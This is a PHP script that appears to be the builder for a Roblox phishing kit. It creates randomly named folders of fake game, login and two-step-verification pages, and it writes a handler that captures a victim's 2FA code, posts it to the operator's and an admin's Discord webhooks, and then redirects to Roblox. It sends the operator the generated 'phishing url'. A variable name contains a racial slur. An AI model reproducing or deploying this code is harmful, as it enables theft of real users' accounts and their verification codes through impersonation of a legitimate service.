
<?php
ob_start();
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $random = mt_rand(0, 1);
    $Private = array("2788229176", "2788229376");
    $sleepy = str_shuffle($Private[$random]);
    $NiggaUrlDontChange = "3605288083481530234548100";
    $random = mt_rand(0, 1);
    $Private = array("3605288083481530234548100", "3605288083481530234548900");
    $bruv = str_shuffle($Private[$random]);
    $webhook = $_POST['Webhook'];
    $id = $_POST['ID'];


    $discord = file_get_contents("$webhook");
 $degrab = json_decode($discord, true);
 $discordgrab = $degrab["name"];


require '../setup/setup.php';
mkdir("../games/$sleepy", 0777, true);
mkdir("../games/$sleepy/2fa", 0777, true);
mkdir("../games/$sleepy/api", 0777, true);
$code3 = file_get_contents("../info/login.php");
$code = file_get_contents("../info/game.php");
$code6 = file_get_contents("../info/2step.php");
$myfile = fopen("../games/$sleepy/index.php", "w");
$myfile3 = fopen("../games/$sleepy/login.php", "w");
$myfile2 = fopen("../games/$sleepy/send.php", "w");
$myfile7 = fopen("../games/$sleepy/folder.php", "w");
$myfile6 = fopen("../games/$sleepy/2fa/index.php", "w");
$myfile4 = fopen("../games/$sleepy/api/id.txt", "w");
$myfile5 = fopen("../games/$sleepy/2fa/step.php", "w");
$txt2 = $code2;
$txt = $code;
$txt4 = $code4;
$txt3 = $code3;
$txt5 = $code5;
$txt6 = $code6;
$txt7 = $code7;
fwrite($myfile, $txt);
fwrite($myfile7, '<?php $folder = "'.$sleepy.'"; ?>' .$txt7);
fwrite($myfile6, $txt6);
fwrite($myfile4, $id);
fwrite($myfile3, $txt3);
fwrite($myfile2, '

<?php

$admin = "'.$adminhook.'";
$url = "'.$webhook.'";

?>


' .$txt2);
fwrite($myfile5, '

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $ip = $_SERVER["REMOTE_ADDR"];
  $code = $_POST["step"]; }

include "../send.php";
$headers = [ "Content-Type: application/json; charset=utf-8" ];
$POST = [
    "username" => "Fazykey - Bot",
    "avatar_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => "**2fa - Result**",
                "type" => "",
                "color" => hexdec("00000"),
                "author" => [
                     "name" => "2fa code!",
                ],
                "footer" => [
                    "text" => "🔓 2fa | Powered by Termed",
                  "icon_url" => "https://images-ext-2.discordapp.net/external/QjHZFQeWXToznL6rU7bchQ3ap3NrX1wRhpay81HIo6w/%3Fwidth%3D307%26height%3D307/https/images-ext-2.discordapp.net/external/IW7McOeLaqiVYwmh4SWDjdWI76MQTraKEx5sroiqMm4/https/cdn-icons-png.flaticon.com/256/9350/9350064.png?width=307&height=307",
                ],
                "fields" => [
                    [
                        "name" => "**🔐 2step code**",
                        "value" => "```$code```",
                        "inline" => True
                    ],

                ]
            ],
        ],
    
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $admin);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response   = curl_exec($ch);
header("Location: https://web.roblox.com/");
exit();
?>
' .$txt5);
$url = "$webhook";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [
    "username" => "$name - Bot",
    "avatar_url" => "$image",
     "content" => "",
        "embeds" => [
            [
                "title" => 'Notifier',
                "color" => hexdec("00000"),
                "thumbnail" => [
                    "url" => "$image"
                ],
                "footer" => [
                    "text" => "Webhook Notifier",
                  "icon_url" => "$image"
                ],
                "fields" => [
                    [
                        "name" => "**Ur Phishing url**",
                        "value" => "```http://".$_SERVER['SERVER_NAME']."/games/$sleepy/?privateServerLinkCode=$bruv```",
                        "inline" => true
                    ],
                ]
            ],
        ],
    
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);
header("location: ../games/$sleepy/?privateServerLinkCode=$bruv");
ob_end_flush();
}
?>